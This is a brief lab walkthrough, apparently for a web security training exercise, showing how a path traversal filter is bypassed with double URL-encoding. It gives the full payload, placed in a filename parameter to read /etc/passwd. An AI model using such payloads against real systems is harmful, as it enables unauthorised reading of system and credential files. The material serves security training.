# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

Intercept a GET request for one of the product images. Change `filename=<image-id>` to `filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66etc/passwd`.

This uses double url-encoding of a typical traversal sequence: `../../../` -> `%2e%2e%2f%2e%2e%2f%2e%2e%2f` -> `%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66`

Check the response to see that the file is returned.